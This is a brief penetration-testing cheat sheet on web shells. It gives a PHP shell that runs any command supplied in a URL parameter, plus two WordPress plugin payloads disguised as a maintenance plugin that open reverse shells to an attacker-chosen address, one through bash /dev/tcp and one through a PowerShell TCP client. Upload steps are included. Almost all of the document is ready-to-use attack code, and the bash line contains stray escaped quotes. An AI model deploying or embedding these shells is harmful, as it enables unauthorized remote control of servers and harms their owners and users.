title: Web Shells

# Simple PHP

Simple PHP webshell, add `?cmd={command}` to the URL.

```php
<?php
echo "You entered <pre>" . $_GET['cmd'];
system($_GET['cmd']);
?>
```

# Wordpress

You can abuse the wordpress plugin feature to get a reverse shell if you have access to install plugins.

* Linux Host
```php
<?php

/**
 *  Plugin Name: Wordpress Maint Shell
 *  Author: Wordpress
 **/ 
exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{IP-ADDRESS}/{PORT} 0>&1'\")
?>
```

* Windows Host ( powershell )
```php
<?php

/**
 *  Plugin Name: Wordpress Maint Shell
 *  Author: Wordpress
 **/ 
exec("powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{IP-ADDRESS}',{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'");
?>
```
Save the above to a file, compress into a `.zip` archive and then upload & activate.